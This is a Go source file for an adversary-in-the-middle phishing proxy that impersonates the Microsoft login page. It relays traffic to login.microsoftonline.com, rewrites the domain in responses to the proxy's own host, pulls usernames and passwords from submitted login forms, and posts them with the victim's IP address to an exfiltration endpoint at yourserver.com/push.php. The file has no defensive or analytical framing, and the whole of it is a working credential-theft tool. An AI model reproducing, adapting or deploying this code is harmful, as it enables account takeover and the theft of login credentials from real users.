package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

const (
	upstream        = "https://login.microsoftonline.com"
	upstreamPath    = "/"
	serverURL       = "https://yourserver.com/push.php"
)

var (
	blockedRegions = []string{}
	blockedIPs     = []string{"0.0.0.0", "127.0.0.1"}
)

func main() {
	http.HandleFunc("/", handleRequest)
	fmt.Println("Starting proxy server on port 8080...")
	http.ListenAndServe(":8080", nil)
}

func handleRequest(w http.ResponseWriter, r *http.Request) {
	region := r.Header.Get("cf-ipcountry")
	ipAddress := r.Header.Get("cf-connecting-ip")

	if isBlocked(region, ipAddress) {
		http.Error(w, "Access denied.", http.StatusForbidden)
		return
	}

	upstreamURL := upstream + upstreamPath + r.URL.Path
	req, err := http.NewRequest(r.Method, upstreamURL, r.Body)
	if err != nil {
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	copyHeaders(r.Header, &req.Header)
	req.Header.Set("Host", "login.microsoftonline.com")
	req.Header.Set("Referer", r.Referer())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		http.Error(w, "Error contacting upstream server", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	bodyString := string(body)

	if r.Method == "POST" {
		username, password := extractCredentials(r)
		if username != "" && password != "" {
			message := fmt.Sprintf("User: %s\nPassword: %s\n", username, password)
			sendToServer(message, ipAddress)
		}
	}

	bodyString = strings.ReplaceAll(bodyString, "login.microsoftonline.com", r.Host)

	for name, values := range resp.Header {
		for _, value := range values {
			w.Header().Add(name, value)
		}
	}

	w.WriteHeader(resp.StatusCode)
	w.Write([]byte(bodyString))
}

func copyHeaders(src http.Header, dst *http.Header) {
	for k, v := range src {
		for _, vv := range v {
			dst.Add(k, vv)
		}
	}
}

func isBlocked(region, ipAddress string) bool {
	for _, blockedRegion := range blockedRegions {
		if strings.EqualFold(blockedRegion, region) {
			return true
		}
	}
	for _, blockedIP := range blockedIPs {
		if blockedIP == ipAddress {
			return true
		}
	}
	return false
}

func extractCredentials(r *http.Request) (string, string) {
	bodyBytes, err := ioutil.ReadAll(r.Body)
	if err != nil {
		return "", ""
	}

	bodyString := string(bodyBytes)
	r.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))

	username := extractValueFromBody(bodyString, "login")
	password := extractValueFromBody(bodyString, "passwd")

	return username, password
}

func extractValueFromBody(body, key string) string {
	params := strings.Split(body, "&")
	for _, param := range params {
		pair := strings.SplitN(param, "=", 2)
		if len(pair) == 2 && pair[0] == key {
			return pair[1]
		}
	}
	return ""
}

func sendToServer(data, ipAddress string) {
	payload := fmt.Sprintf(`{"data": "%s", "ip": "%s"}`, data, ipAddress)
	_, err := http.Post(serverURL, "application/json", strings.NewReader(payload))
	if err != nil {
		fmt.Println("Failed to send data to server:", err)
	}
}
